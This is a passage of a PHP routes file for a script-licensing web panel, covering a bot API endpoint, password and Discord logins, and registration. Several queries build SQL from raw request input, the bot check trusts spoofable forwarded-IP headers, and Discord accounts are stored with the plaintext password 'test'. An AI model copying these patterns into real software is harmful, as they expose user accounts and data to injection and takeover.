        $sonuc = $query->fetchAll(PDO::FETCH_ASSOC);
        $json_veri = json_encode($sonuc, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
        echo $json_veri;
    }
});

Route::post('/api/createscript', function(){
    include('conn.php');

    if (!empty($_SERVER['HTTP_CLIENT_IP'])){
    	$ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
    	$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	}else{
		$ip = $_SERVER['REMOTE_ADDR'];
    }

    if($ip == $botip){
        $discordid = @$_REQUEST["discordid"];
        $script = @$_REQUEST["script"];
        $gelenip = @$_REQUEST["ip"];

        $ips = json_decode($gelenip);
        $scripts = json_decode($script);

        foreach( $scripts as $rowscript ){
            $query = $db->query("SELECT * FROM scripts WHERE script='$rowscript'", PDO::FETCH_ASSOC);
            if ($query->rowCount()){
                foreach( $query as $row ){
                    $idd = $row["id"];
                    foreach( $ips as $rowip ){
                        $query = $db->prepare("INSERT INTO licenses SET name = ?, script = ?, ip = ?, status = ?, variables = ?, owner = ?, deadline = ?"); 
                        $insert = $query->execute(array("Via discord",$idd,$rowip,"active", $discordid,"1","2025-01-01"));
                    }
                }
            }
        }
    }  
});

Route::get('/login', function(){
    if(@$_SESSION['loggedin'] != TRUE){
        include('conn.php');
        include('view/login.view.php');
    }else{
        header('Location: /main'); 
    }
});

Route::post('/login', function(){
    include('conn.php');

    if (!empty($_SERVER['HTTP_CLIENT_IP'])){
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }

    if(filter_var(@$_REQUEST["username"], FILTER_VALIDATE_EMAIL)){
        $query = $db->query("SELECT * FROM accounts WHERE email='" . @$_REQUEST["username"] . "'",PDO::FETCH_ASSOC);
    }else{
        $query = $db->query("SELECT * FROM accounts WHERE username='" . @$_REQUEST["username"] . "'",PDO::FETCH_ASSOC);
    }

	$row = $query->fetch();
	if ($row >= 1) {
		if(password_verify(@$_REQUEST["password"] . "skrttbeamerboi", $row["password"])){
			if($row["active"] == "true"){
				session_regenerate_id();
			
				$_SESSION['username'] = @$_REQUEST["username"];
            	$_SESSION['name'] = $row["name"];
            	$_SESSION['email'] = $row["email"];
				$_SESSION['id'] = $row["id"];
            	$_SESSION['loggedin'] = TRUE;
            	$_SESSION['permission'] = $row["permission"];


				header('Location: /login?id=0'); 
			}else{
				header('Location: /login');
			}
		}else{
            $owner = $row["id"];
            $datetime = date("d/m/Y h:i");
            $query = $db->prepare("INSERT INTO logs SET title = ?, text = ?, isread = ?, icon = ?, color = ?, type = ?, owner = ?, data = ?, date = ?"); 
            $insert = $query->execute(array('Failed login attempt', $ip . ' attempt to login.','false','mdi-lock-alert','text-danger', "non-license", $owner, "none", $datetime));
			header('Location: /login?id=1'); 
		}
	}else{
        header('Location: /login?id=2');
    }
});

Route::post('/login/discord', function(){
    include('conn.php');

    $_SESSION['state'] = hash('sha256', microtime(TRUE).rand().$_SERVER['REMOTE_ADDR']);
    unset($_SESSION['access_token']);
    
    $params = array(
        'client_id' => OAUTH2_CLIENT_ID,
        'redirect_uri' => CALLBACK_URL,
        'response_type' => 'code',
        'scope' => SCOPE,
        'state' => $_SESSION['state']
    );
    
    //Redirect to Discord Auth Page
    header('Location: ' . AUTH_URL . '?' . http_build_query($params));
    die();

});

Route::get('/login/discord/callback', function(){
    include('conn.php');

    if(!$_REQUEST["state"] || $_SESSION['state'] != $_REQUEST["state"]) {
        header('Location: ' . $_SERVER['PHP_SELF']);
        die();
    }
    
    //Exchange auth_code for token
    $token = apiRequest(TOKEN_URL, true, array (
        'client_id' => OAUTH2_CLIENT_ID,
        'client_secret' => OAUTH2_CLIENT_SECRET,
        'grant_type' => 'authorization_code',
        'code' => $_REQUEST["code"],
        'redirect_uri' => CALLBACK_URL,
        'scope' => SCOPE
    ));
    
    $_SESSION['access_token'] = $token->access_token;

    $user = apiRequest(URL_BASE, false, '');

    $username = $user->id;
    
    $query = $db->query("SELECT * FROM accounts WHERE username='$username' AND email='$user->email'",PDO::FETCH_ASSOC);
    $usernamecount = $query->rowCount();
    if($usernamecount == 0){
        $result = $db->prepare("INSERT INTO accounts SET name=?, email=?, username=?, password=?, permission=?, lc_count=?, sc_count=?, active=?");
        $result->execute(array($user->username, $user->email, $user->id, "test", "0",$onDiscordRegisterLicenseCount, $onDiscordRegisterScriptCount,$automaticActiveAccount));

        $queryy = $db->query("SELECT * FROM accounts WHERE username='$username'",PDO::FETCH_ASSOC);
        $row = $queryy->fetch();
		
		if($row["active"] == "true"){
			session_regenerate_id();
        	$_SESSION['username'] = $username;
        	$_SESSION['name'] = $row["name"];
        	$_SESSION['email'] = $row["email"];
			$_SESSION['id'] = $row["id"];
        	$_SESSION['loggedin'] = TRUE;
        	$_SESSION['permission'] = $row["permission"];
        	header('Location: /main');	
		}else{
			header('Location: /login');
		}
        
    }else{
        $row = $query->fetch();
		if($row["active"] == "true"){
			session_regenerate_id();
        	$_SESSION['username'] = $username;
        	$_SESSION['name'] = $row["name"];
        	$_SESSION['email'] = $row["email"];
			$_SESSION['id'] = $row["id"];
        	$_SESSION['loggedin'] = TRUE;
        	$_SESSION['permission'] = $row["permission"];
        	header('Location: /main');
		}else{
			header('Location: /login');
		}
    }

});

Route::get('/register', function(){
    include('conn.php');
    include('view/register.view.php');
});

Route::post('/register', function(){
    include('conn.php');

    $username = @$_REQUEST["username"];
    $email = @$_REQUEST["email"];
	$password = password_hash(@$_REQUEST['password'] . "skrttbeamerboi", PASSWORD_DEFAULT);
    if(isset($_REQUEST["check"])){$check = "on";}else{$check = "off";}

    $query = $db->query("SELECT * FROM accounts WHERE username='$username'",PDO::FETCH_ASSOC);
    $usernamecount = $query->rowCount();

    $query = $db->query("SELECT * FROM accounts WHERE email='$email'",PDO::FETCH_ASSOC);
    $emailcount = $query->rowCount();

	if ($usernamecount == 0 && $emailcount == 0 ){
        $result = $db->prepare("INSERT INTO accounts SET name=?, email=?, username=?, password=?, permission=?, lc_count=?, sc_count=?,active=?");
        $result->execute(array(@$_REQUEST['name'], @$_REQUEST['email'], $username, $password, "0", $onRegisterLicenseCount, $onRegisterScriptCount, $automaticActiveAccount));
        
        header('Location: /register?id=0');
    }else{
        header('Location: /register?id=1');
    }
});

Route::fallback(function(){
    include('conn.php');
	include('view/404.view.php');
});

